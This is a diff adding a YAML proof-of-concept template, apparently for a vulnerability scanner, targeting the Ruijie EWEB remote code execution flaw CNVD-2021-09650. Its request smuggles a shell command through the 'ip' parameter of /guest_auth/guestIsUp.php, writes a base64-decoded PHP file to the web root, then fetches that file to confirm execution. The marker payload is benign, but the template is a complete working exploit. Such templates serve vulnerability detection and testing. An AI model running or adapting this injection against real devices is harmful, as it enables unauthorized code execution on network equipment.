@@ -1,0 +1,31 @@
+name: poc-yaml-ruijie-eweb-rce-cnvd-2021-09650
+manual: true
+transport: http
+set:
+    r1: randomLowercase(4)
+    r2: randomLowercase(4)
+    phpcode: >
+        "<?php echo '" + r1 + "'; unlink(__FILE__); ?>"
+
+    payload: base64(phpcode)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /guest_auth/guestIsUp.php
+            body: |
+                ip=127.0.0.1|echo '{{payload}}' | base64 -d > {{r2}}.php&mac=00-00
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /guest_auth/{{r2}}.php
+        expression: response.status == 200 && response.body.bcontains(bytes(r1))
+expression: r0() && r1()
+detail:
+    author: White(https://github.com/WhiteHSBG)
+    links:
+        - https://xz.aliyun.com/t/9016?page=1
+        - https://www.ruijie.com.cn/gy/xw-aqtg-gw/86747/
